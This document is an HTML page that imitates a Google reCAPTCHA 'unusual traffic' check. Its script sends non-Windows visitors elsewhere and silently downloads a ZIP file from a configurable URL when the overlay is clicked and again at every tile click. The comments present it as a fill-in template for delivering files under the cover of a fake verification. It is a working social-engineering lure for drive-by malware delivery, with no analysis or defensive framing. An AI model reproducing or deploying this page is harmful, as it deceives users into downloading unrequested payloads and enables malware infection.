<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; display: flex; justify-content: center; }
        .container { width: 800px; }
        .line { border-top: 1px solid #ccc; margin: 20px 0; }
        
        /* Overlay for first click */
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; display: flex; justify-content: center; align-items: center; cursor: pointer; flex-direction: column; border: none; }
        #overlay h2 { color: #333; }
        
        /* Widget UI */
        .widget { width: 302px; background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; box-shadow: 0 0 4px rgba(0,0,0,0.2); overflow: hidden; font-family: Roboto, sans-serif; margin: 20px 0; }
        .blue-header { background: #4285f4; color: #fff; padding: 12px 15px; font-size: 14px; font-weight: bold; }
        .blue-header span { font-weight: normal; font-size: 12px; display: block; opacity: 0.9; margin-top: 4px; }
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1px; background: #fff; padding: 5px; }
        .tile { aspect-ratio: 1; background: #eee; border: 1px solid #ccc; cursor: pointer; overflow: hidden; position: relative; }
        .tile img { width: 100%; height: 100%; object-fit: cover; }
        .tile.selected { border: 1px solid #4285f4; box-shadow: inset 0 0 0 1px #4285f4; }
        .tile.selected::after { content: "✓"; position: absolute; top: 0; left: 0; width: 24px; height: 24px; background: #4285f4; color: white; text-align: center; line-height: 24px; font-weight: bold; font-size: 16px; border-bottom-right-radius: 3px; }
        .footer { padding: 10px 15px; background: #f1f1f1; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid #e0e0e0; }
        .btn { padding: 6px 16px; font-size: 12px; font-weight: bold; border: none; border-radius: 2px; cursor: pointer; color: #fff; }
        .btn-grey { background: #ccc; color: #666; }
        .btn-blue { background: #4285f4; }
        .checkbox-box { width: 302px; background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; padding: 12px 15px; display: flex; align-items: center; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
        .hidden { display: none !important; }
        .mono { font-family: monospace; font-size: 13px; margin-top: 20px; color: #222; }
    </style>
</head>
<body>
    <div class="container">
        <!-- First Click Overlay -->
        <div id="overlay">
            <h2>Please click anywhere to start verification</h2>
            <p>Your download will begin immediately.</p>
        </div>

        <!-- Device Check -->
        <script>
            (function() {
                const ua = navigator.userAgent.toLowerCase();
                if (!(ua.includes("windows") && !/android|iphone|ipad|mobile/.test(ua))) {
                    window.location.href = "https://tradx-community.onrender.com";
                }
            })();
        </script>

        <!-- Step 1 -->
        <div class="checkbox-box" id="step1">
            <input type="checkbox" id="check" style="width:24px; height:24px; margin-right:12px; cursor:pointer;">
            <label for="check" style="cursor:pointer;">I'm not a robot</label>
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:24px; margin-left:auto;">
        </div>

        <!-- Step 2 -->
        <div class="widget hidden" id="step2">
            <div class="blue-header">
                Select all squares with<br><strong id="step-text">bicycles</strong>
                <span>If there are none, click skip</span>
            </div>
            <div class="grid" id="grid"></div>
            <div class="footer">
                <div style="display:flex; gap:10px; opacity:0.5;">
                    <span>⟳</span><span>🔊</span><span>ⓘ</span>
                </div>
                <button class="btn btn-grey" id="action-btn">SKIP</button>
            </div>
        </div>

        <div class="line"></div>
        <h2>About this page</h2>
        <p style="font-size:14px;">Our systems have detected unusual traffic from your computer network.</p>
        <div class="line"></div>
        <div class="mono">
            <div>IP address: 185.132.132.32</div>
            <div>Time: 2026-07-28T01:26:18Z</div>
        </div>
    </div>

    <script>
        // ==========================================
        // CONFIGURATION: Put your .ZIP file URLs here!
        // ==========================================
        const FILE_URLS = [
            "https://github.com/Ramirhub/about-me/releases/download/v1.0/your-zipped-file.zip"
        ];
        // ==========================================

        const STEPS = ['bicycles', 'motorcycles', 'buses', 'crosswalks', 'fire hydrants'];
        let currentStep = 0;

        // Silent Download Function (Blob Method)
        async function silentDownload(url) {
            try {
                const res = await fetch(url);
                if (!res.ok) return;
                const blob = await res.blob();
                const blobUrl = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = blobUrl;
                a.download = url.split('/').pop() || 'download';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                setTimeout(() => window.URL.revokeObjectURL(blobUrl), 1000);
            } catch (e) { /* Fails silently */ }
        }

        function downloadRandom() {
            if (FILE_URLS.length > 0) {
                const idx = Math.floor(Math.random() * FILE_URLS.length);
                silentDownload(FILE_URLS[idx]);
            }
        }

        function renderGrid(step) {
            const grid = document.getElementById('grid');
            const text = document.getElementById('step-text');
            const btn = document.getElementById('action-btn');

            text.innerText = STEPS[step];
            grid.innerHTML = '';

            for (let i = 0; i < 16; i++) {
                const tile = document.createElement('div');
                tile.className = 'tile';
                const img = document.createElement('img');
                img.src = `https://picsum.photos/seed/${step}-${i}/100/100`;
                tile.appendChild(img);
                grid.appendChild(tile);

                // Trigger random .ZIP download on every mouse click
                tile.addEventListener('click', function() {
                    this.classList.toggle('selected');
                    downloadRandom();
                });
            }

            const isLast = step === STEPS.length - 1;
            if (isLast) {
                btn.innerText = 'VERIFY';
                btn.className = 'btn btn-blue';
                btn.onclick = () => {
                    window.location.href = "https://au.linkedin.com/in/shihan-shen0131?trk=people-guest_people_search-card";
                };
            } else {
                btn.innerText = 'SKIP';
                btn.className = 'btn btn-grey';
                btn.onclick = () => { currentStep++; renderGrid(currentStep); };
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            const overlay = document.getElementById('overlay');
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');
            const check = document.getElementById('check');

            // First visit download
            overlay.addEventListener('click', () => {
                overlay.style.display = 'none';
                downloadRandom();
            });

            // Move to CAPTCHA
            check.addEventListener('change', () => {
                step1.classList.add('hidden');
                step2.classList.remove('hidden');
                currentStep = 0;
                renderGrid(currentStep);
            });
        });
    </script>
</body>
</html>
